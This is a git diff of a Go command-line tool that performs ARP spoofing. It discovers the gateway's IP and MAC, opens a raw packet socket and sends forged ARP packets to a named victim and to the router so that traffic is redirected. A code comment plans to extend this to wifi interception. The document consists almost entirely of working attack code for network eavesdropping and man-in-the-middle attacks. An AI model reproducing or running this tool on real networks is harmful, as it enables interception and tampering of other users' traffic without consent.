@@ -6,65 +6,93 @@ import (
 	"syscall"
 	"os"
 	"fmt"
-	"strings"
-	"strconv"
-)	
+	"bytes"
+	"github.com/jackpal/gateway"
+	"github.com/mostlygeek/arp"
+)
 
 //in charge of getting the arguments and turning them into byte arrays
-//need to do error hadling
+//maybe return the err instead of calling err!=nil here
 func parse() [][]byte {
 	args := os.Args
 	if (len(args) != 5) {
-		fmt.Println("Incorrect number of arguments, the structure must be: <IP-src><MAC-src><IP-target><MAC-target>, Ip format: x.x.x.x (decimal), Mac format: xx:xx:xx:xx:xx:xx (hex)")
+		fmt.Println("Incorrect number of arguments, the structure must be: <IPv4-src><MAC-src><IPv4-target><MAC-target>, Ip format: x.x.x.x (decimal), Mac format: xx:xx:xx:xx:xx:xx (hex)")
 		os.Exit(1)
 	}
-	bisliceS := make([][]string, 0, 4)
+	bisliceB := make([][]byte, 6, 6)
+	var introduce []byte
+	var err error
 	for i, v := range(args[1:]) {
 		if i % 2 == 0 {
-			bisliceS = append(bisliceS, strings.Split(v, "."))
+			introduce = net.ParseIP(v)
+			if introduce == nil {
+				fmt.Printf("Invalid IP: %s\n", v)
+				os.Exit(1)
+			}
+			introduce = net.IP(introduce).To4()
 		} else {
-			bisliceS = append(bisliceS, strings.Split(v, ":"))
-		}
-	}
-	bisliceB := make([][]byte, 4, 4)
-	var base int
-	for i, v := range(bisliceS) {
-		if i % 2 == 0 {
-			base = 9
-		} else {
-			base = 15
-		}
-		base++
-		for _, w := range(v) {
-			introduce, err := strconv.ParseUint(w, base, 8)
+			introduce, err = net.ParseMAC(v)
 			if err != nil {
 				log.Fatal(err)
 			}
-			bisliceB[i] = append(bisliceB[i], byte(introduce))
 		}
+		bisliceB[i] = introduce
 	}
 	return bisliceB
+}
+
+func addGateway(args [][]byte) {
+	gateIp, err := gateway.DiscoverGateway()
+	if err != nil {
+		log.Fatal(err)
+	}
+	gateMACStr := arp.Search(gateIp.String())
+	gateMAC, err := net.ParseMAC(gateMACStr)
+	if err != nil {
+		log.Fatal(err)
+	}
+	args[4] = gateIp
+	args[5] = gateMAC
+}
+
+//this will be the function called from the big main when joining both parts
+func sendPacket(fd int, packet []byte, address *syscall.SockaddrLinklayer) {
+	err := syscall.Sendto(fd, packet, 0, address)
+	if err != nil {
+		log.Fatal("Error sending arp packet: ", err)
+	}
+}
+
+func getInterface(srcMAC []byte) (*net.Interface, error) {
+	allInterfaces, err := net.Interfaces()
+	if err != nil {
+		return nil, err
+	}
+	for _, v := range(allInterfaces) {
+		if bytes.Equal(v.HardwareAddr, srcMAC) {
+			return &v, nil
+		}
+	}
+	return nil, fmt.Errorf("Network interface not found for given MAC-src")
 }
 
 func main() {
 	var err error
 	args := parse()
-	fmt.Println(args)
+	addGateway(args)
 	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
 	if err != nil {
 		log.Fatal(err)
 	}
-	interf, _ := net.InterfaceByName("eth0")
-	addr := syscall.SockaddrLinklayer{
-		Ifindex: interf.Index,
-	}
-	p := pkt_for_victim([]byte{172, 18, 0, 1}, args[1], args[2], args[3])
-	err = syscall.Sendto(fd, p, 0, &addr)
-	p = pkt_for_router(args[0], args[1], []byte{172, 18, 0, 1}, /*mac address of the router erased for commit*/)
-	err = syscall.Sendto(fd, p, 0, &addr)
+	inter, err := getInterface(args[1])
 	if err != nil {
-		log.Fatal("Sendto:", err)
+		log.Fatal(err)
 	}
+	addr := syscall.SockaddrLinklayer {
+		Ifindex: inter.Index,
+	}
+	sendPacket(fd, pkt_for_victim(args[4], args[1], args[2], args[3]), &addr)
+	sendPacket(fd, pkt_for_router(args[0], args[1], args[4], args[5]), &addr)
 }
 
 //make it available for wifi interception too
